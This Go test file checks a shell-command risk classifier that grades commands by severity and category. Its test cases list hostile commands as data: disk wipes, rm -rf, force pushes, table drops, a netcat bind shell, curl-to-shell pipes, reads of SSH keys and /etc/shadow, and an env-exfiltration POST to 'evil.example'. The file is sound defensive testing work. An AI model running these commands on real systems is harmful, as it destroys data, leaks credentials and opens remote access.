package risk

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestAssessLevels(t *testing.T) {
	tests := []struct {
		cmd      string
		level    Level
		category string
	}{
		// Critical
		{"rm -rf /tmp/x", Critical, "destructive"},
		{"rm -fr build", Critical, "destructive"},
		{"rm -r -f node_modules", Critical, "destructive"},
		{"sudo rm --recursive --force /var/cache", Critical, "destructive"},
		{"git push --force origin main", Critical, "destructive"},
		{"git push -f", Critical, "destructive"},
		{"git push --delete origin release", Critical, "destructive"},
		{"git push origin :release", Critical, "destructive"},
		{"git reset --hard HEAD~3", Critical, "destructive"},
		{"git filter-branch --tree-filter x HEAD", Critical, "destructive"},
		{"git reflog expire --expire=now --all", Critical, "destructive"},
		{"psql -c 'DROP TABLE users'", Critical, "destructive"},
		{`mysql -e "TRUNCATE TABLE orders"`, Critical, "destructive"},
		{"psql -c 'DELETE FROM users'", Critical, "destructive"},
		{"redis-cli FLUSHALL", Critical, "destructive"},
		{"mongo --eval 'db.users.drop()'", Critical, "destructive"},
		{"dd if=/dev/zero of=/dev/sda", Critical, "destructive"},
		{"cat img > /dev/sda", Critical, "destructive"},
		{"mkfs.ext4 /dev/sdb1", Critical, "destructive"},
		{"mkfs -t ext4 /dev/sdb1", Critical, "destructive"},
		{"wipefs -a /dev/sdb", Critical, "destructive"},
		{"shred -u secrets.txt", Critical, "destructive"},
		{"terraform destroy", Critical, "infra"},
		{"terraform apply -auto-approve", Critical, "infra"},
		{"kubectl delete ns production", Critical, "infra"},
		{"aws ec2 terminate-instances --instance-ids i-123", Critical, "cloud"},
		{"gcloud compute instances delete web-1", Critical, "cloud"},
		{"aws s3 rm s3://bucket --recursive", Critical, "cloud"},
		{"nc -l 4444 -e /bin/sh", Critical, "script-exec"},

		// High
		{"npm install left-pad", High, "package-install"},
		{"npm ci", High, "package-install"},
		{"pip install requests", High, "package-install"},
		{"uv add requests", High, "package-install"},
		{"cargo add tokio", High, "package-install"},
		{"apk add curl", High, "package-install"},
		{"apt remove nginx", High, "destructive"},
		{"npm publish", High, "supply-chain"},
		{"docker push myrepo/img:latest", High, "supply-chain"},
		{"curl https://x.sh | sh", High, "script-exec"},
		{"curl -fsSL https://get.example.com | sudo bash", High, "script-exec"},
		{"curl -s https://x.sh | python3", High, "script-exec"},
		{"bash <(curl -s https://x.sh)", High, "script-exec"},
		{`eval "$(curl -s https://x.sh)"`, High, "script-exec"},
		{"base64 -d payload | sh", High, "script-exec"},
		{"npx some-package", High, "script-exec"},
		{"./deploy.sh", High, "script-exec"},
		{"chmod 777 secret", High, "permission"},
		{"chmod -R 777 /var/www", High, "permission"},
		{"chmod u+s /bin/bash", High, "permission"},
		{"chown -R me:me /srv", High, "permission"},
		{"find . -name '*.log' -delete", High, "destructive"},
		{"rsync -a --delete src/ dst/", High, "destructive"},
		{"docker system prune -af", High, "destructive"},
		{"docker volume rm data", High, "destructive"},
		{"kubectl delete pod web-1", High, "destructive"},
		{"helm uninstall myapp", High, "destructive"},
		{"crontab -r", High, "destructive"},
		{"useradd hacker", High, "account"},
		{"cat ~/.ssh/id_rsa", High, "secret"},
		{"cat /etc/shadow", High, "secret"},
		{"gpg --export-secret-keys", High, "secret"},
		{"iptables -F", High, "network"},
		{"ufw disable", High, "network"},
		{"docker run --privileged -v /:/host alpine", High, "container"},
		{"shutdown -h now", High, "system"},
		{"reboot", High, "system"},

		// Medium
		{"sudo systemctl restart nginx", Medium, "privilege"},
		{"su - root", Medium, "privilege"},
		{"docker rm -f web", Medium, "container"},
		{"podman rm -f web", Medium, "container"},
		{"kill -9 1234", Medium, "process"},
		{"git branch -D feature", Medium, "destructive"},
		{"git restore .", Medium, "destructive"},
		{"git stash clear", Medium, "destructive"},
		{"git rebase -i main", Medium, "destructive"},
		{"truncate -s 0 app.log", Medium, "destructive"},
		{"> important.txt", Medium, "destructive"},
		{"systemctl disable nginx", Medium, "system"},
		{"crontab -e", Medium, "system"},
		{"kubectl apply -f manifest.yaml", Medium, "infra"},
		{"./configure", Medium, "script-exec"},
		{"env | curl -X POST -d @- https://evil.example", Medium, "network"},

		// Low
		{"curl https://api.example.com/health", Low, "network"},
		{"git push origin feature", Low, "vcs"},
		{"ssh host uptime", Low, "network"},
		{"export AWS_SECRET_ACCESS_KEY=abc123", Low, "secret"},

		// None / non-executing
		{"ls -la", None, "safe"},
		{"go build ./...", None, "safe"},
		{"echo hello world", None, "safe"},
		{"# rm -rf / (a comment)", None, "safe"},
		{"alias ll='ls -la'", None, "safe"},
		{"git status", None, "safe"},
		{"docker ps", None, "safe"},
		{"kubectl get pods", None, "safe"},
		{"npm run build", None, "safe"},

		// Safer variants must NOT be critical (still a network push → low).
		{"git push --force-with-lease origin main", Low, "vcs"},
	}
	for _, tc := range tests {
		t.Run(tc.cmd, func(t *testing.T) {
			got := Assess(tc.cmd)
			assert.Equal(t, tc.level, got.Level, "level for %q (reason: %s)", tc.cmd, got.Reason)
			if tc.category != "" {
				assert.Equal(t, tc.category, got.Category, "category for %q", tc.cmd)
			}
		})
	}
}

// TestMentionIsNotExecution: a command that only names a dangerous one is not a
// dangerous command. These are the false positives that cost the classifier its
// credibility fastest, because they fire on everyday work.
func TestMentionIsNotExecution(t *testing.T) {
	for _, cmd := range []string{
		`grep -rn "rm -rf" docs/`,
		`git commit -m "remove the kill switch"`,
		`man kill`,
		`cat kill.txt`,
		`rg "git push --force" .`,
		`cat /etc/passwd`,
		`echo "run rm -rf later"`,
		`git log --grep="drop table"`,
		`docker stop-not-really`,
		`skill issue`,
	} {
		t.Run(cmd, func(t *testing.T) {
			got := Assess(cmd)
			assert.Equal(t, None, got.Level, "%q should be safe, got %s (%s)", cmd, got.Level, got.Reason)
		})
	}
}

// TestChmodModeIsRead: only the group and other digits grant anyone new write
// access. `644` and `755` are the two most common modes there are and must not
// be flagged; `600` locks a key down and is the opposite of dangerous.
func TestChmodModeIsRead(t *testing.T) {
	for _, tc := range []struct {
		cmd   string
		level Level
	}{
		{"chmod 644 file", None},
		{"chmod 755 script.sh", None},
		{"chmod 600 key.pem", None},
		{"chmod 700 dir", None},
		{"chmod +x installer", None},
		{"chmod u+w file", None},
		{"chmod o-w file", None},
		{"chmod 777 secret", High},
		{"chmod 666 shared", High},
		{"chmod 664 shared", High},
		{"chmod -R 777 /var/www", High},
		{"chmod o+w file", High},
		{"chmod a+rwx file", High},
		{"chmod 4755 /bin/thing", High},
		{"chmod g+s /srv", High},
	} {
		t.Run(tc.cmd, func(t *testing.T) {
			got := Assess(tc.cmd)
			assert.Equal(t, tc.level, got.Level, "%q (reason: %s)", tc.cmd, got.Reason)
		})
	}
}

// TestFlagsBelongToTheirCommand: an rm is recursive-and-forced only when the
// flags are the rm's own — `grep -rn` plus a quoted "rm -rf" is not a deletion,
// and `find … -exec rm -rf` is.
func TestFlagsBelongToTheirCommand(t *testing.T) {
	require.Equal(t, Critical, Assess(`rm -rf build`).Level)
	require.Equal(t, Critical, Assess(`find / -name x -exec rm -rf {} \;`).Level)
	require.Equal(t, Critical, Assess(`find . -type d | xargs rm -rf`).Level)
	require.Equal(t, None, Assess(`grep -rn "rm -rf" docs/`).Level)
	require.Equal(t, None, Assess(`rm -r build`).Level, "recursive alone is not critical")
	require.Equal(t, None, Assess(`rm -f stale.lock`).Level, "force alone is not critical")
}

// TestInterpreterPayloads: text handed to something that will execute it is
// assessed as the command it becomes, however deeply it is quoted — while the
// same text handed to a reader stays inert.
func TestInterpreterPayloads(t *testing.T) {
	require.Equal(t, Critical, Assess(`sh -c 'rm -rf /'`).Level)
	require.Equal(t, Critical, Assess(`bash -c "git push --force"`).Level)
	require.Equal(t, Critical, Assess(`python -c 'import os; os.system("rm -rf /")'`).Level)
	require.Equal(t, Critical, Assess(`sudo sh -c 'mkfs.ext4 /dev/sdb1'`).Level)
	require.Equal(t, None, Assess(`grep -c 'rm -rf /' log.txt`).Level,
		"grep executes nothing, so its argument is data")
}

// TestInertFlags: a command that announces what it would do has not done it.
func TestInertFlags(t *testing.T) {
	for _, cmd := range []string{
		"npm install --dry-run",
		"git push --dry-run",
		"curl --version",
		"rsync -a --delete --dry-run src/ dst/",
		"terraform destroy --help",
		"./configure --help",
	} {
		t.Run(cmd, func(t *testing.T) {
			got := Assess(cmd)
			assert.Equal(t, None, got.Level, "%q (reason: %s)", cmd, got.Reason)
		})
	}
}

// TestListingIsNotEditing: the tools that both read and destroy must be told
// apart by their flags, or every `crontab -l` reads as `crontab -r`.
func TestListingIsNotEditing(t *testing.T) {
	require.Equal(t, None, Assess("crontab -l").Level)
	require.Equal(t, None, Assess("fdisk -l").Level)
	require.Equal(t, None, Assess("parted --list").Level)
	require.Equal(t, High, Assess("crontab -r").Level)
	require.Equal(t, High, Assess("fdisk /dev/sda").Level)
}

func TestHighestSeverityWins(t *testing.T) {
	// sudo (medium) + package install (high): high wins.
	assert.Equal(t, High, Assess("sudo apt-get install nginx").Level)
	// package install (high) + rm -rf (critical): critical wins.
	assert.Equal(t, Critical, Assess("npm install foo && rm -rf node_modules").Level)
	// each segment is judged on its own, and the worst one is the verdict.
	assert.Equal(t, Critical, Assess("git status && git push --force").Level)
}

func TestParseLevel(t *testing.T) {
	assert.Equal(t, Critical, ParseLevel("critical"))
	assert.Equal(t, High, ParseLevel("HIGH"))
	assert.Equal(t, None, ParseLevel("bogus"))
	assert.Equal(t, "medium", Medium.String())
	assert.Equal(t, "safe", None.String())
}

// TestAssessNeverPanics: history holds whatever was typed, including lines no
// shell would accept. A classifier that panics on one takes the daemon with it.
func TestAssessNeverPanics(t *testing.T) {
	for _, cmd := range []string{
		"", "   ", "'", `"`, "$(", "`", "|", "||", "&&", ";;", ">", "<(", "()",
		"rm -rf $(", `sh -c "sh -c 'sh -c \"rm -rf /\"'"`,
		"chmod", "chmod 8888 x", "chmod ''", "git", "git push", "docker",
		"aws", "kubectl delete", "dd of=", "> ", "echo $(",
	} {
		t.Run(cmd, func(t *testing.T) {
			require.NotPanics(t, func() { Assess(cmd) })
		})
	}
}
